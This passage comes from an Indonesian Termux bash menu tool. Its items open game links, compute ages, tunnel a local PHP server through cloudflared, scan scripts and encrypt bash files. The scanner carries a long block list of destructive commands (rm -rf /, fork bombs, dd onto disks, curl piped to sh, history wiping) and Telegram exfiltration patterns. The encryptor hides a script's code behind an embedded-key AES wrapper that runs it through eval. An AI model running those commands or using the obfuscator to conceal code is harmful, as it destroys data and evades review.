⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠶⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠤⠤⠤⠴⠇
" | lolcat 
echo -e "${g}===============${r} GAME DINOSAURUS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://dino-nu-olive.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME DINOSAURUS URL LINK..!!"
echo ""
  ;;
3|03)
clear 
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿
⣿⣿⡇⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⣿⣿⣿
⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
" | lolcat 
echo -e "${g}===============${r} GAME NINVADERS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://ninvaders.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME NINVADERS URL LINK..!!"
echo ""
  ;;
4|04)
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢔⣫⣭⣭⣒⣒⠦⢤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢊⣵⣿⠿⠋⠀⠀⠉⠙⠓⣶⣬⣙⠲⢄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢊⣴⣿⠟⠁⠀⢀⡴⠶⣤⡀⠀⢈⠑⠊⠿⡆⠑⣄⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢞⣴⣿⠟⠁⠀⢀⣴⣏⣉⠓⠺⡇⠀⢸⣿⣷⣦⡄⠀⡸⠃
⠀⠀⠀⠀⠀⠀⢰⢃⣾⡿⠃⠀⠀⣴⠿⢤⣄⣈⠉⠓⢷⠀⠘⣿⣿⣿⣿⠞⠀⠀
⠀⠀⠀⠀⠀⠀⢸⢸⣿⡇⠀⠀⣼⠧⣤⣀⣀⡈⠉⢻⣟⡤⡀⠙⠟⣹⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡄⢻⣧⠀⠀⣿⡀⠀⠀⠈⠉⠉⣿⡜⠀⠈⠒⠚⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⡄⢻⣦⠀⠸⣏⠉⠉⠙⠛⠛⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢻⣆⠀⠹⣤⠤⠤⠤⠤⣿⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⢻⣧⠀⢻⡄⠀⠀⠀⣻⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⢻⣧⠀⢻⡉⠉⠉⠙⣏⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⢻⣧⠈⢷⡤⠤⠶⢿⣴⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⢻⣧⠈⣧⣀⣀⣼⣇⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⢻⣆⠘⣧⠀⣀⣹⡽⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢿⣆⠘⣏⠁⣈⣷⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠈⣎⢿⡆⠹⡏⢁⣹⡾⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⠔⣉⠠⣬⣑⠢⡀⠀⠀⠀⠘⡜⣿⡀⢻⡉⣈⣧⠇⠀⠀⠀⠀⠀
⠀⠀⠀⡠⢊⣴⠞⠉⢷⣝⢿⣷⣬⡢⣄⠀⠀⢇⢹⣧⠘⣏⣁⣽⡼⢀⠀⠀⠀⠀
⠀⢀⠊⠰⣿⡁⠀⡴⠋⠙⣶⣝⠻⣿⣮⣑⢄⣸⢸⣿⠀⣿⣡⢼⢇⣶⣍⡢⣄⠀
⠀⣀⠇⣀⡀⠉⠛⠦⣤⣞⠀⣸⠛⢳⠾⠿⣧⠉⣼⣿⠀⣿⢤⡾⠘⠛⣛⣡⣎⢢
⢎⣀⠘⠛⠿⢷⣦⣄⡠⢭⣙⡛⠲⠾⠖⠚⣁⣼⣿⢏⣼⣧⠞⣡⣿⣿⣿⣿⠟⡸
⠀⠀⠈⠉⠒⠒⠠⠬⠭⠅⢀⣉⣉⣙⣛⣛⣛⣉⠀⠬⠭⠤⠬⠭⠭⠭⠍⠒⠉⠀
" | lolcat
echo -e "${g}===============${r} GAME ULAR ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://ular-lime.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME ULAR URL LINK..!!"
echo ""
  ;;
5|05)
clear 
echo ""
echo -e "${g} Keluar dari tools..!!"
echo ""
;;
*)
clear 
echo ""
echo -e "${c} Pilihan Anda Tidak Valid..!!"
echo ""
;;
esac
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
        47)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
echo "
 ▗▄▄▖▗▄▄▄▖▗▖ ▗▖    ▗▖ ▗▖▗▖  ▗▖▗▖ ▗▖▗▄▄▖ 
▐▌   ▐▌   ▐▌▗▞▘    ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌▐▌ ▐▌
▐▌   ▐▛▀▀▘▐▛▚▖     ▐▌ ▐▌▐▌  ▐▌▐▌ ▐▌▐▛▀▚▖
▝▚▄▄▖▐▙▄▄▖▐▌ ▐▌    ▝▚▄▞▘▐▌  ▐▌▝▚▄▞▘▐▌ ▐▌
" | lolcat            
echo -e "${g}===============${r} Cek Umur Seseorang ${g}==============="
echo -e "${c}"
read -p "Masukkan tahun lahir seseorang : " tahun_lahir
echo ""
if ! [[ "$tahun_lahir" =~ ^[0-9]{4}$ ]]; then
    echo -e "${r}Pilihan anda tidak valid harus 4 digit..!!"
fi
tahun_sekarang=$(date +%Y)
umur=$((tahun_sekarang - tahun_lahir))
if (( umur < 0 )); then
    echo -e "${b}Tahun tidak ada blum menuju ke masa depan..!!"
    echo ""
elif (( umur == 0 )); then
    echo -e "${p}Anda baru lahir umur anda skrng ${y}: ${r}0 tahun."
    echo ""
else
    echo -e "${y}Umur Anda sekarang adalah ${c}: ${g}$umur tahun."
    echo ""
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       48)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo ""
echo -e "${g} Sedang Menginstall Package...!!"
sleep 2
echo -e "${c}"
pkg update && pkg install cloudflared
clear
echo ""
echo -e "${r} Package Telah Di Install Menjalankan Program...!!"
sleep 3
clear
echo "
 ▗▄▄▖▗▖    ▗▄▖ ▗▖ ▗▖▗▄▄▄ ▗▄▄▖ ▗▄▄▄▖▗▄▄▄ 
▐▌   ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌  █▐▌ ▐▌▐▌   ▐▌  █
▐▌   ▐▌   ▐▛▀▜▌▐▌ ▐▌▐▌  █▐▛▀▚▖▐▛▀▀▘▐▌  █
▝▚▄▄▖▐▙▄▄▖▐▌ ▐▌▝▚▄▞▘▐▙▄▄▀▐▌ ▐▌▐▌   ▐▙▄▄▀
 " | lolcat 
clauderfred_thonxyzz404() {
  echo ""
  read -p "$(echo -e "${y}Masukkan Port Yang Ingin Anda Gunakan ${r}[ ${g}Misall 8080 ${r}]${c} : ")" port
  echo ""
  echo -e "${r}[ ${g}• ${r}]${c} Menjalankan Server PHP Lokal Di Port $port...!!!"
  echo ""
  php -S localhost:$port > /dev/null 2>&1 &
  sleep 3
  echo -e "${r}[ ${g}• ${r}]${c} Membuat Link Publik Dari Cloudflared...!!!"
  echo ""
  cloudflared tunnel --url http://localhost:$port --protocol http2 > sendlink 2>&1 &
  sleep 8
  link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
  if [ -n "$link" ]; then
    echo -e "${r}[ ${g}✓ ${r}]${c} Link Clauderfred Anda ${g}: ${y}$link"
    echo ""
  else
    echo ""
    echo -e "${g}[ ${r}X ${g}]${y} Gagall Membuat Link. Pastikan Cloudflared Terinstal Dengan Benar...!!"
    echo ""
  fi
}
clauderfred_thonxyzz404
echo ""
echo -e "${cyan}Tekan Enter Untuk Jika Ingin Mematikan Server"
echo -e "${red}"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       49)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
clear
echo "
▗▖ ▗▖▗▄▄▖ ▗▖    ▗▄▖  ▗▄▖ ▗▄▄▄ ▗▄▄▄▖▗▖  ▗▖ ▗▄▄▖
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌  █  █  ▐▛▚▖▐▌▐▌   
▐▌ ▐▌▐▛▀▘ ▐▌   ▐▌ ▐▌▐▛▀▜▌▐▌  █  █  ▐▌ ▝▜▌▐▌▝▜▌
▝▚▄▞▘▐▌   ▐▙▄▄▖▝▚▄▞▘▐▌ ▐▌▐▙▄▄▀▗▄█▄▖▐▌  ▐▌▝▚▄▞▘
" | lolcat
echo -e "${g}===============${r} By.Thonxyzz404 ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://t.me/top4top_bot"
echo ""
echo -e "${g} SELESAI MEMBUKA BOTZ UPLOAD GAMBAR URL...!!"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       50)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[1;32m'
p='\033[1;35m'
c='\033[1;36m'
r='\033[1;31m'
y='\033[1;33m'
n='\033[0m'
shopt -s globstar nullglob
log_file="/sdcard/Simpanan_Hasil.txt"
danger_patterns=("bot_token" "chat_id" "api.telegram.org" "sendMessage" "getUpdates")
dangerous_commands=(
"rm -rf /storage/emulated/0/"
":(){ :|:& };:"
"rm -rf /"
"rm -rf *"
"dd if=/dev/zero of=/dev/sda"
"chmod 777 / -R"
"pkill -u \$USER"
"shutdown -h now"
"reboot"
"mkfs.ext4 /dev/sda"
"> file_konfigurasi"
"mv /dev/null /"
"yes > file_baru"
"wget .* | sh"
"curl .* | sh"
"busybox --install -s /system/xbin"
"rm -rf ~"
"rm -rf \$HOME"
"~/.bash_history"
"history -c"
"pkill -9 -u \$USER"
":(){ :|:& };: & disown"
"while true; do :; done"
"dd if=/dev/urandom of=/dev/sda"
"mkfs.ext4 /dev/block/mmcblk0p*"
"chmod -R 000 /"
"chown -R nobody:nobody /"
"mv /system/bin /dev/null"
"rm /system/bin/*"
"echo > /dev/sda"
"yes rm -rf / &"
"rm -rf /system"
"rm -rf /data"
"dd if=/dev/zero of=/dev/block/mmcblk0"
"mkfs.ext4 /dev/block/mmcblk0p1"
"chmod -R 777 /system"
"chown -R root:root /system"
"mv /system /dev/null"
"rm /system/*"
"yes > /dev/sda1"
"dd if=/dev/urandom of=/dev/sda1"
"pkill -9 -u root"
":(){ :|:& };: &"
"while true; do rm -rf /; done"
"rm -rf /sdcard"
"rm -rf /storage"
"dd if=/dev/zero of=/dev/sdb"
"mkfs.ext4 /dev/sdb1"
"chmod -R 000 /data"
"chown -R nobody:nobody /data"
"mv /data /dev/null"
"rm -rf /storage/emulated/0/Android/media"
"rm -rf /storage/emulated/0/Android/data"
"rm -rf /storage/emulated/0/Android"
"rm -rf /storage/emulated/0/Download"
"rm -rf /storage/emulated/0/Pictures"
"rm -rf /storage/emulated/0/DCIM"
"dd if=/dev/zero of=/storage/emulated/0/.*\.txt bs=1M"
)
function scan_file() {
    local file="$1"
    for pattern in "${danger_patterns[@]}"; do
        if grep -qE "$pattern" "$file"; then
            echo ""
            echo -e "${r}[ ${g}X ${r}]${c} Ditemukan Indikasi Berbahaya Di File : $file"
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${p} Pola Terdeteksi : $pattern"
            echo ""
            echo "[`date`] $file -> $pattern" >> "$log_file"
            return 1
        fi
    done
    for cmd in "${dangerous_commands[@]}"; do
        if grep -qE "$cmd" "$file"; then
            echo ""
            echo -e "${r}[ ${g}X ${r}]${y} Ditemukan Perintah Berbahaya Di File : $file"
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${p} Pola Terdeteksi : $cmd"
            echo ""
            echo "[`date`] $file -> PERINTAH BERBAHAYA : $cmd" >> "$log_file"
            return 1
        fi
    done
    return 0
}
function start_scan() {
    local dir="${1:-.}"
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Memindai Direktori : $dir"
    for file in "$dir"/**/*.{sh,py,js,php}; do
        [[ -f "$file" ]] || continue
        scan_file "$file" || {
            echo -e "${r}[ ${g}X ${r}]${c} Eksekusi Diblokir : $file"
            chmod -x "$file"
        }
    done
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Pemindaian Selesai. Hasil Disimpan Di : $log_file"
    echo ""
}
function scan_specific_file() {
    echo -e "${n}"
    read -p "Masukkan file yang ingin di scan : " input
    if [[ -f "$input" ]]; then
        echo ""
        echo -e  "${r}[ ${g}✓ ${r}]${g} Memindai File : $input"
        scan_file "$input" || {
            echo -e "${r}[ ${g}X ${r}]${y} Eksekusi Diblokir : $input"
            echo ""
            chmod -x "$input"
        }
    else
        echo ""
        echo -e "${r}[ ${p}X ${r}]${g} File Tidak Ditemukan : $input"
        echo ""
    fi
}
function menu_404() {
echo ""
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡿⢋⣼⣿⣧⡙⢿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣶⣾⣛⣯⣥⣶⣿⣿⣿⣿⣿⣷⣌⠛⢿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⣿⣿⣟⠛⠛⠋⠉⠉⢉⣉⣤⣤⣿⣿⣿⣿⠿⠛⠁⠀⢻⣿⣿⣿⣿⣶⣬⡙⠛⠿⣶⣤⣤⠀⠀⣀⠀⠀
⢸⣇⣿⠈⢻⣷⣾⠿⢿⣿⡿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣤⣤⣘⣿⠀⠀
⠘⣿⣿⡀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⢻⡇⠀⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢻⡜⣿⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⠀⢸⡇⣿⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠸⣿⣿⡄⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⣿⢻⡇⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⢻⣟⣿⠀⢸⣷⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠛⠻⠿⣿⣿⣿⣿⡇
⠀⠀⠘⣿⣿⡀⢸⣿⡀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠛⣻⣿⣧
⠀⠀⠀⣿⣿⣇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿
⠀⠀⠀⠸⣿⣿⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿
⠀⠀⠀⠀⣿⣿⣇⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿
⠀⠀⠀⠀⠘⣿⣿⡄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣸⣿⣿⡟
⠀⠀⠀⠀⠀⢻⣿⣷⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⢻⣿⣷⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢰⣿⣿⣿⠁
⠀⠀⠀⠀⠀⠀⠈⢿⣿⣧⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣧⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣼⣿⣿⡿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⡀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣼⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣆⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣼⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⣄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢀⣼⣿⣿⣿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣷⣦⣀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣷⣦⣄⡈⠙⠻⠿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⠿⣶⣦⣤⣌⣻⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
    echo ""
    echo "╔══════════════════════════════╗"
    echo "║     FOLDER SCANNER v1.0      ║"
    echo "╠══════════════════════════════╣"
    echo "║ 1. Scan folder saat ini      ║"
    echo "║ 2. Scan folder khusus        ║"
    echo "║ 3. Lihat log hasil deteksi   ║"
    echo "║ 4. Scan file spesifik        ║"
    echo "║ 5. Keluar                    ║"
    echo "╚══════════════════════════════╝"
    echo -e "${g}"
    read -p "[?] Pilihan Anda : " opt
    echo -e "${r}"
    case $opt in
        1) start_scan "." ;;
        2) read -p "Masukkan Path Folder : " path; start_scan "$path" ;;
        3) cat "$log_file" 2>/dev/null || echo "Belum ada deteksi." ;;
        5) echo "Keluar...!!"; exit ;;
        4) scan_specific_file ;;
        *) echo -e "${r}Pilihan tidak valid";;
    esac
}
menu_404
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       ENC1|enc1)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
n='\033[0m'  
g='\033[1;32m'  
c='\033[1;36m'  
r='\033[1;31m'  
y='\033[1;33m'  
echo ""
echo -e "${g} Sedang Menginstall Package...!!"
sleep 3 
echo -e "${n}"
pkg install openssl-tool
clear 
clear_terminal() {
  if [[ "$OSTYPE" == "linux-android"* ]]; then
    clear
  else
    tput reset
  fi
}
banner() {
cat << "EOF" | lolcat 

███████╗███╗   ██╗ ██████╗    ██████╗  █████╗ ███████╗██╗  ██╗
██╔════╝████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██║  ██║
█████╗  ██╔██╗ ██║██║         ██████╔╝███████║███████╗███████║
██╔══╝  ██║╚██╗██║██║         ██╔══██╗██╔══██║╚════██║██╔══██║
███████╗██║ ╚████║╚██████╗    ██████╔╝██║  ██║███████║██║  ██║
╚══════╝╚═╝  ╚═══╝ ╚═════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ 

 • Creator : Thonxyzz404
 • Akun Tiktok : @thonxyzz404
 • Info : AES-ECB Bash Encryption
EOF
}
obfuscate_code() {
  sed 's/exec/x_x_e_c/g' "$1" > .tmp_obfuscated
}
generate_key() {
  head -c 16 /dev/urandom | xxd -p
}
check_dependencies() {
  command -v openssl >/dev/null 2>&1 || {
    echo ""
    echo -e "${r}Error : Anda Blum Menginstall ${c}pkg install openssl-tool"
    echo ""
    exit 1
  }
}
encrypt_file() {
  local infile="$1"
  local key_hex="$2"
  local outfile="${1%.*}_encrypted.sh"
  emoji_seq="😹😹😹😹😹😹😹😹😹😹😹"
  openssl enc -aes-128-ecb -K "$key_hex" -nosalt -in .tmp_obfuscated -out .tmp_encrypted.bin || {
    echo ""
    echo -e "${r}Error during encryption with openssl...!!"
    echo ""
    exit 1
  }
  base64 .tmp_encrypted.bin > .tmp_encrypted.b64 || {
    echo ""
    echo -e "${y}File Lokasi Tidak Ditemukan...!!"
    echo ""
    exit 1
  }
  key_b64=$(echo "$key_hex" | base64)
  enc_b64=$(cat .tmp_encrypted.b64)
  decoder=$(cat <<EOF
k="$key_b64"
d="$enc_b64"
echo "\$d" | base64 -d > .tmp_dec.bin
openssl enc -d -aes-128-ecb -K "\$(echo \$k | base64 -d)" -nosalt -in .tmp_dec.bin -out .tmp_dec.sh
chmod +x .tmp_dec.sh
bash .tmp_dec.sh
rm -f .tmp_dec.bin .tmp_dec.sh
EOF
)
  {
    echo "#!/data/data/com.termux/files/usr/bin/bash"
    echo "# Encrypted Bash File By.Thonxyzz404"
    echo "emoji_aes=( $(for i in {1..3000}; do echo -n "\"$emoji_seq\" "; done) )"
    echo ""
    echo "eval \"\$(cat <<'EODEC'
$decoder
EODEC
)\""
    echo "emoji_dump=( $(for i in {1..9000}; do echo -n "\"$emoji_seq\" "; done) )"
  } > "$outfile"
  chmod +x "$outfile"
  rm -f .tmp_obfuscated .tmp_encrypted.bin .tmp_encrypted.b64
  echo ""
  echo -e "${g}File Sudah Tersimpan Ke File Folder Sdcard Anda...!!"
  echo ""
}
main() {
  clear_terminal
  banner
  echo -e "${y}"
  read -p "Masukkan Lokasi File Anda : " input_file
  echo -e "${r}"
  [[ ! -f "$input_file" ]] && { echo "File not found."; exit 1; }
  check_dependencies
  obfuscate_code "$input_file"
  key_hex=$(generate_key)
  encrypt_file "$input_file" "$key_hex"
}
main
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      ENC2|enc2)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
